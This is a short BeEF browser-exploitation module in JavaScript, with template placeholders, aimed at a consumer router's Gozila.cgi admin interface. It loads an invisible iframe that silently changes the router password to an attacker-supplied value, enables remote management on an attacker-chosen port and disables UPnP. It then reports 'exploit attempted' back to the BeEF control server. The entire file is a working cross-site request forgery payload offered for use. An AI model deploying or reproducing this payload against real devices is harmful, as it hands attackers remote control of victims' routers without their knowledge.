beef.execute(function() {
  var iframe = beef.dom.createInvisibleIframe();
  iframe.setAttribute('src', '<%= @base %>Gozila.cgi?PasswdModify=1&sysPasswd=<%= @password %>&sysPasswdConfirm=<%= @password %>&Remote_Upgrade=1&Remote_Management=1&RemotePort=<%= @port %>&UPnP_Work=0');
  beef.net.sendback("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
});
